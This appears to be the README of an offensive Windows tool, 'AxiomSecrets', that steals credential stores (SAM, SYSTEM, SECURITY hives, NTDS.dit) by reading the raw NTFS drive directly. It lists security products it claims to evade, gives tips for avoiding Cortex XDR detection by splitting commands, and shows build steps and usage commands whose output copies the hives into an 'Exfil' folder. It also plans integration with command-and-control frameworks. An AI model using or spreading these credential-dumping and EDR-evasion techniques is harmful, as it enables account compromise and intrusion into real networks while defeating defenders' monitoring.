## AxiomSecrets

Extract protected files (like SAM/SYSTEM hives) by directly parsing the raw NTFS drive.

Gone be the ShadowCopies and other over-the-network secretsdump, read any protected file by opening a handle directly to the drive. Obviously requires admin privs.

## Evasion efficiency
| Solution              | Status         |
|-----------------------|:--------------:|
| Defender AV           |  ✅ - OK       |
| Defender for Endpoint |  ✅ - OK       |
| Symantec EDR          |  ✅ - OK       |
| Kaspersky EDR         |  ✅ - OK       |
| Sophos                |  ⚠️ - Untested |
| Trend Micro           |  ⚠️ - Untested |
| HarfangLab            |  ✅ - OK       |
| WithSecure            |  ⚠️ - Untested |
| Cortex XDR            |  ✅ - OK (special case detailed below)       |
| Sentinel ONE          |  ✅ - OK       |
| Crowdstrike Falcon    |  ✅ - OK (In lab only)       |

### Cortex XDR - Notes
While this attack appears functional for this EDR, Cortex doesn't seem to like copying ALL files at once. IMO this is more of command-line detection than behavioral.

Instead of copying all hives in one run like this:
```powershell
PS> .\AxiomSecrets.exe C:\Windows\System32\config\SAM C:\Windows\System32\config\SYSTEM C:\Windows\System32\config\SECURITY X:\exfil
```

You should do it in 3 separate runs like this:
```powershell
PS> .\AxiomSecrets.exe C:\Windows\System32\config\SAM X:\exfil
PS> .\AxiomSecrets.exe C:\Windows\System32\config\SYSTEM X:\exfil
PS> .\AxiomSecrets.exe C:\Windows\System32\config\SECURITY X:\exfil
```

This is untested with copying `NTDS.dit` on Cortex XDR. If the EDR indeed has strict command-line inspection, passing this keyword in a command line might get you flagged as well I guess.

## TODO
- Sometimes file backup crashes on misaligned clusters, leaving incomplete files. If you are lucky file might still be usable but that's still a bugger. My theory is that we need special handling in case the file is physically split in different locations on the drive and we need to rebuild it.
- Add a Beacon Object File compilation option, to use with your favorite C2

## Building the .exe file
Install build dependencies:
```bash
$ apt-get update
$ apt-get install make mingw-w64
```

Build the binary:
```bash
$ make
Precompiling main.o...                            [OK]
[...]

[COMPILATION SUCCESSFUL]

$ ls AxiomSecrets.exe
-rwxr-xr-x 1 1000 users 950272 Nov  4 00:39 AxiomSecrets.exe
```

## Usage
The binary takes a variadic list of arguments as input, with the last argument being the directory where to store backed up files:
```powershell
PS> .\AxiomSecrets.exe C:\Windows\System32\config\SAM C:\Windows\System32\config\SYSTEM Z:\Exfil
[+] Volume opened
[+] Root directory parsed
[+] Subdirectory Windows found
[+] Subdirectory System32 found
[+] Subdirectory config found
[+] All subdirectories have been traversed
[+] File SAM opened
[+] Attributes set for SAM
[+] SAM size: 65536
[+] File SAM backed up
[+] Volume opened
[+] Root directory parsed
[+] Subdirectory Windows found
[+] Subdirectory System32 found
[+] Subdirectory config found
[+] All subdirectories have been traversed
[+] File SYSTEM opened
[+] Attributes set for SYSTEM
[+] SYSTEM size: 13369344
[+] File SYSTEM backed up
[...]
```
The above command stores copies of the SAM and SYSTEM hives into an Exfil directory on the Z: drive.

## Community

Opening issues or pull requests very much welcome.
Suggestions welcome as well.

## License

This software is under GNU GPL 3.0 license (see LICENSE file).
This is a free, copyleft license that allows users to run, study, share, and modify software, provided that all distributed versions and derivatives remain open source under the same license.

